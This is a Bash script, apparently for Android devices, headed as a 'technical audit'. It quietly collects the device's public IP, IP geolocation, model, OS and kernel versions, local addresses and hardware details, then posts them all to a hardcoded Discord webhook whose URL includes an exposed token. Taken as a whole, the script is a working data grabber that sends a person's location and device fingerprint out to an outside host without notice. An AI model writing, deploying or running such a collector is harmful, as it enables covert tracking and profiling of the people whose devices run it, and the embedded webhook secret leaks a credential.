#!/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

# 1. COLETA DE REDE E GEOLOCALIZACAO
PUB_IP=$(curl -s --connect-timeout 5 https://ifconfig.me || echo "0.0.0.0")
IP_DATA=$(curl -s --connect-timeout 5 "http://ip-api.com" | tr '\n' ' ' || echo "Erro na coleta")

# 2. SISTEMA E HARDWARE (SEM EMOJI)
MODEL=$(getprop ro.product.model)
BRAND=$(getprop ro.product.brand)
MANUF=$(getprop ro.product.manufacturer)
ANDROID=$(getprop ro.build.version.release)
SDK=$(getprop ro.build.version.sdk)
KERN=$(uname -r)
UPT=$(uptime -p)

# 3. REDE E MEMORIA
LOC_IPS=$(ip addr show | grep 'inet ' | awk '{print $2}' | tr '\n' ',' | sed 's/,$//')
RAM=$(free -h | awk '/Mem:/ {print $3 "/" $2}')
DISK=$(df -h /data | awk 'NR==2 {print $4 " livres de " $2}')

# 4. CPU (TRATAMENTO DE ERRO)
CPU=$(grep -m 1 'Processor' /proc/cpuinfo | cut -d: -f2 | sed 's/^[ \t]*//' || echo "N/A")
[ -z "$CPU" ] && CPU=$(grep -m 1 'model name' /proc/cpuinfo | cut -d: -f2 | sed 's/^[ \t]*//')

# 5. ENVIO VIA CURL (FORMATO JSON LIMPO)
# Usamos jq se disponível, mas aqui vai no formato texto puro para evitar falhas
PAYLOAD="{\"content\": \"AUDITORIA TECNICA ANDROID\", \"embeds\": [{\"title\": \"DADOS TÉCNICOS\", \"fields\": [
{\"name\": \"DISPOSITIVO\", \"value\": \"Marca: $BRAND\nFab: $MANUF\nMod: $MODEL\nAndroid: $ANDROID (SDK $SDK)\nKernel: $KERN\nUptime: $UPT\"},
{\"name\": \"REDE E IP\", \"value\": \"Publico: $PUB_IP\nInternos: $LOC_IPS\nDados IP: $IP_DATA\"},
{\"name\": \"HARDWARE\", \"value\": \"CPU: $CPU\nRAM: $RAM\nDisco: $DISK\"}
]}]}"

curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$URL"
